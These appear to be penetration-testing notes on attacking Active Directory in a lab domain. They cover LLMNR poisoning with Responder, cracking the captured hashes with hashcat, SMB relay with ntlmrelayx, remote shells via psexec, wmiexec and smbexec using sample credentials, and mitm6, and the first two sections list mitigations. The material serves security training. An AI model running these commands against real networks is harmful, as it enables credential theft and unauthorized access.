---
description: Hacking Active directory
---

# Responder / SMB Relay

### LLMNR Poisoning

DNS or NBT-NS. Responds with NTLMv2 hash.

`responder -I eth0 -rdwv`

`hashcat -m 5600 hashes.txt rockyou.txt`

Mitigation:

* Disable LLMNR

  Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor&gt; "Turn OFF Multicast Name Resolution" 

* Disable NBT-NS

  Network Connections &gt; Network Adapter Properties &gt; TCPv4 Properties &gt; Advanced tab &gt; WINS tab &gt; select "Disable NetBIOS over TCP/IP"

\(Else\)

* Require Network Access Control
* Strong user passwords &gt; 14 characters and limit common word usage.

### SMB Relay

SMB signing must be disabled on target.

We can scan if host has SMB signing disabled using nessus, smbsign, nmap etc. Below is an namp scan result example where the SMB signing is 'not required' and can perform relay attacks on

```text
nmap --script=smb2-security-mode.nse -p445 192.168.42.0/24

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

Steps:

1. write target ip address to `targets.txt`
2. Config responder to turn off 'HTTP' and 'SMB' to prevent responding to these protocols `/usr/share/responder/Responder./conf`
3. Use `ntlmrelayx.py -tf targets.txt -smb2support`

Mitigation:

* Enable SMB signing on all
  * pro: completely stops attacks. 
  * con: causes performance issues with file copying
* Disable NTLM auth
  * pro: completely stops attacks
  * con: if kerberos stop working, windows default back to NTLM
* Account tiering
  * pro: Limits domain admins to specific tasks
  * con: enforicing policy may be difficult
* Local admin restriction
  * pro: prevents alot lateral movements.
  * con: potentially increase in amount of service desk tickets

### SMB gaining shell access

```bash
# Impacket
psexec.py adhacking.local/saul:Password123@192.168.42.139

# Wmiexec
wmiexec.py adhacking.local/saul:Password123@192.168.42.139

# Smbexec
smbexec.py adhacking.local/saul:Password123@192.168.42.139

# Metasploit
exploit(windows/smb/psexec) > 

```

### IPv6 Attacks

mitm6 [https://github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)

`mitm6 -d adhacking.local`

relay attack

